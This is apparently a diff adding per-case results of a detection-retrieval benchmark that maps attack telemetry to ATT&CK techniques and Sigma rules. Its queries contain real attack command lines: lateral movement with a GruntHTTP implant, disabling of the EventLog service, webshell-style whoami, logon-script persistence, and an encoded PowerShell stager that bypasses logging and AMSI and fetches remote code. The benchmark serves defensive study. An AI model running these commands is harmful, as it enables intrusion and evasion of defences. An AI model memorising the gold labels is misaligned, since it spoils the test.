+        "T1059.001",
+        "T1218.004",
+        "T1216.001",
+        "T1218.007"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-070",
+      "query": "C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6 C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe \"C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\" ",
+      "kind": "technique",
+      "gold": [
+        "T1059.003"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 8,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.003",
+        "T1070.010",
+        "T1218.014",
+        "T1202",
+        "T1204.004"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-070",
+      "query": "C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6 C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe \"C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1059.003"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 2,
+      "ndcg5": 0.36005461457723403,
+      "n_relevant": 155,
+      "top": [
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "1228c958-e64e-4e71-92ad-7d429f4138ba",
+        "4f2cd9b6-4a17-440f-bb2a-687abb65993a",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "438025f9-5856-4663-83f7-52f878a70a50"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-070",
+      "query": "Image: C:\\Windows\\System32\\cmd.exe\nCommandLine: \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6\nParentImage: C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\nParentCommandLine: \"C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1059.003"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.3391602052736161,
+      "n_relevant": 155,
+      "top": [
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "f1f3bf22-deb2-418d-8cce-e1a45e46a5bd",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "0bbc6369-43e3-453d-9944-cae58821c173",
+        "4f2cd9b6-4a17-440f-bb2a-687abb65993a"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-070",
+      "query": "\"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6",
+      "kind": "technique",
+      "gold": [
+        "T1059.003"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 9,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1070.010",
+        "T1204.004",
+        "T1218.003",
+        "T1218.014",
+        "T1570"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-071",
+      "query": "C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe  172.18.39.6 C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6",
+      "kind": "technique",
+      "gold": [
+        "T1021.003"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1070.010",
+        "T1218.014",
+        "T1570",
+        "T1218.003",
+        "T1080"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-071",
+      "query": "C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe  172.18.39.6 C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1021.003"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.3391602052736161,
+      "n_relevant": 31,
+      "top": [
+        "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
+        "6b65c28e-11f3-46cb-902a-68f2cafaf474"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-071",
+      "query": "Image: C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe\nCommandLine: C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe  172.18.39.6\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1021.003"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.5531464700081437,
+      "n_relevant": 31,
+      "top": [
+        "f1f3bf22-deb2-418d-8cce-e1a45e46a5bd",
+        "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "438025f9-5856-4663-83f7-52f878a70a50"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-071",
+      "query": "C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe  172.18.39.6",
+      "kind": "technique",
+      "gold": [
+        "T1021.003"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1070.010",
+        "T1570",
+        "T1080",
+        "T1204.004",
+        "T1105"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-093",
+      "query": "C:\\Windows\\System32\\reg.exe REG  ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog /t REG_DWORD /v Start /d 4 C:\\Windows\\System32\\cmd.exe C:\\Windows\\system32\\cmd.exe",
+      "kind": "technique",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1685.001",
+        "T1547.010",
+        "T1574.011",
+        "T1218.010"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-093",
+      "query": "C:\\Windows\\System32\\reg.exe REG  ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog /t REG_DWORD /v Start /d 4 C:\\Windows\\System32\\cmd.exe C:\\Windows\\system32\\cmd.exe",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 2,
+      "ndcg5": 0.5296347172140421,
+      "n_relevant": 63,
+      "top": [
+        "24357373-078f-44ed-9ac4-6d334a668a11",
+        "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
+        "5e95028c-5229-4214-afae-d653d573d0ec",
+        "d7b81144-b866-48a4-9bcc-275dc69d870e",
+        "9b0b7ac3-6223-47aa-a3fd-e8f211e637db"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-093",
+      "query": "Image: C:\\Windows\\System32\\reg.exe\nCommandLine: REG  ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog /t REG_DWORD /v Start /d 4\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 2,
+      "ndcg5": 0.21398626473452756,
+      "n_relevant": 63,
+      "top": [
+        "9b0b7ac3-6223-47aa-a3fd-e8f211e637db",
+        "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
+        "f1edd233-30b5-4823-9e6a-c4171b24d316",
+        "2a072a96-a086-49fa-bcb5-15cc5a619093",
+        "0bbc6369-43e3-453d-9944-cae58821c173"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-093",
+      "query": "REG  ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog /t REG_DWORD /v Start /d 4",
+      "kind": "technique",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1685.001",
+        "T1547.001",
+        "T1547.010",
+        "T1574.011",
+        "T1546.001"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-095",
+      "query": "C:\\Windows\\System32\\cmd.exe cmd /c whoami C:\\Windows\\System32\\inetsrv\\w3wp.exe c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm8e72bd3c-90fe-435f-bda2-fdb8731bc136 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0",
+      "kind": "technique",
+      "gold": [
+        "T1190"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1555.004",
+        "T1505.002",
+        "T1218.003",
+        "T1203",
+        "T1552.006"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-095",
+      "query": "C:\\Windows\\System32\\cmd.exe cmd /c whoami C:\\Windows\\System32\\inetsrv\\w3wp.exe c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm8e72bd3c-90fe-435f-bda2-fdb8731bc136 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1190"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 5,
+      "top": [
+        "2d3cdeec-c0db-45b4-aa86-082f7eb75701",
+        "797011dc-44f4-4e6f-9f10-a8ceefbe566b",
+        "438025f9-5856-4663-83f7-52f878a70a50",
+        "cc1abf27-78a3-4ac5-a51c-f3070b1d8e40",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-095",
+      "query": "Image: C:\\Windows\\System32\\cmd.exe\nCommandLine: cmd /c whoami\nParentImage: C:\\Windows\\System32\\inetsrv\\w3wp.exe\nParentCommandLine: c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm8e72bd3c-90fe-435f-bda2-fdb8731bc136 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1190"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 5,
+      "top": [
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "438025f9-5856-4663-83f7-52f878a70a50",
+        "797011dc-44f4-4e6f-9f10-a8ceefbe566b",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "9cfc00b6-bfb7-49ce-9781-ef78503154bb"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-095",
+      "query": "cmd /c whoami",
+      "kind": "technique",
+      "gold": [
+        "T1190"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1059.003",
+        "T1047",
+        "T1218.014",
+        "T1218.001",
+        "T1218.003"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-096",
+      "query": "C:\\Windows\\System32\\reg.exe REG.exe  ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\Users\\wardog\\AppData\\Local\\Temp\\art.bat /f C:\\Windows\\System32\\cmd.exe \"C:\\windows\\system32\\cmd.exe\" ",
+      "kind": "technique",
+      "gold": [
+        "T1037.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1037.001",
+        "T1546.001",
+        "T1218.011",
+        "T1112"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-096",
+      "query": "C:\\Windows\\System32\\reg.exe REG.exe  ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\Users\\wardog\\AppData\\Local\\Temp\\art.bat /f C:\\Windows\\System32\\cmd.exe \"C:\\windows\\system32\\cmd.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1037.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 15,
+      "ndcg5": 0.0,
+      "n_relevant": 2,
+      "top": [
+        "8f3ab69a-aa22-4943-aa58-e0a52fdf6818",
+        "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
+        "62e0298b-e994-4189-bc87-bc699aa62d97",
+        "efec536f-72e8-4656-8960-5e85d091345b",
+        "c80e66d8-1780-48a9-b412-46663fd21ac0"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-096",
+      "query": "Image: C:\\Windows\\System32\\reg.exe\nCommandLine: REG.exe  ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\Users\\wardog\\AppData\\Local\\Temp\\art.bat /f\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\windows\\system32\\cmd.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1037.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 2,
+      "top": [
+        "9b0b7ac3-6223-47aa-a3fd-e8f211e637db",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "aa2efee7-34dd-446e-8a37-40790a66efd7",
+        "4281cb20-2994-4580-aa63-c8b86d019934",
+        "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-096",
+      "query": "REG.exe  ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\Users\\wardog\\AppData\\Local\\Temp\\art.bat /f",
+      "kind": "technique",
+      "gold": [
+        "T1037.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1037.001",
+        "T1546.001",
+        "T1003.002",
+        "T1112"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-112",
+      "query": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAYQBMAFUARQAoACQAbgBVAGwATAApADsASQBmACgAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMAbwBsAGwARQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAEMALgBEAEkAYwBUAEkATwBuAGEAcgBZAFsAUwB0AHIASQBuAGcALABTAFkAcwBUAEUAbQAuAE8AYgBKAEUAYwB0AF0AXQA6ADoAbgBlAHcAKAApADsAJABWAGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBhAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAdABCAGwATwBDAGsAXQAuACIARwBlAFQARgBJAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBsAHUARQAoACQATgBVAEwATAAsACgATgBlAHcALQBPAEIAagBFAGMAVAAgAEMAbwBMAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAGEAUwBIAFMARQB0AFsAUwBUAFIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUARgBdAC4AQQBzAHMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUARQAoACQAbgB1AGwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAEUAdAAuAFMARQByAHYAaQBDAGUAUABvAEkATgBUAE0AQQBuAGEARwBFAFIAXQA6ADoARQB4AFAAZQBjAHQAMQAwADAAQwBPAG4AdABpAG4AVQBlAD0AMAA7ACQARgA5ADQARQA9AE4AZQB3AC0ATwBiAEoARQBDAHQAIABTAFkAcwBUAEUATQAuAE4AZQBUAC4AVwBlAGIAQwBMAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAEkAYwBPAEQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAE8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBBAHMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAEUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABlAC4AUABSAE8AeABZAD0AWwBTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAdQBFAHMAdABdADoAOgBEAGUARgBBAFUATAB0AFcARQBCAFAAUgBPAFgAeQA7ACQARgA5ADQARQAuAFAAcgBPAFgAWQAuAEMAUgBlAEQAZQBuAHQASQBhAEwAUwAgAD0AIABbAFMAWQBTAFQAZQBNAC4ATgBlAHQALgBDAHIARQBkAGUATgBUAGkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAGUAZgBBAHUAbAB0AE4ARQB0AHcATwBSAGsAQwByAGUARABFAE4AdABpAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBTAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBDAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAFMAKAAnADMAKwBZAG0AYwBuACkAcwAwAHIAOAA9ACMAZAB4AFoANgA1ADsAfQBPACUAfABMAGwASABpAH4AZgB7AHoAQgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEYAOQA0AEUALgBIAGUAQQBEAGUAUgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEoAUQBPAEgAdQBEAEcAcgBOAEwARwBlAE8AUAB5AGwAPQBFADIASAB6AGoANgAxAGwAdQBpADcAaABXAE0AWQBRAGUANgAzAFcAVQB3AHMAMAB6AFoAOAA9ACIAKQA7ACQAZABhAHQAQQA9ACQAZgA5ADQARQAuAEQATwBXAG4ATABvAEEARABEAGEAdABhACgAJABzAGUAUgArACQAdAApADsAJABJAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAGQAYQBUAEEALgBsAGUAbgBHAFQASABdADsALQBqAG8ASQBOAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA== C:\\Windows\\System32\\wscript.exe \"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" ",
+      "kind": "technique",
+      "gold": [
+        "T1059.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1059.001",
+        "T1216.002",
+        "T1546.013",
+        "T1546.007",
+        "T1218.014"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-112",
+      "query": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAYQBMAFUARQAoACQAbgBVAGwATAApADsASQBmACgAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMAbwBsAGwARQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAEMALgBEAEkAYwBUAEkATwBuAGEAcgBZAFsAUwB0AHIASQBuAGcALABTAFkAcwBUAEUAbQAuAE8AYgBKAEUAYwB0AF0AXQA6ADoAbgBlAHcAKAApADsAJABWAGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBhAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAdABCAGwATwBDAGsAXQAuACIARwBlAFQARgBJAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFM